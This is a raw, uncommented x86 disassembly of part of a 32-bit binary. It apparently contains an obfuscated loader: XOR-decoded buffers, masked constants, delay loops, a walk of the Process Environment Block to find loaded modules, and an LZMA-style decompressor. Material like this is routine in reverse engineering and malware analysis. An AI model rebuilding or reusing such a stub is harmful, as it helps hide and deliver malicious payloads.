  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
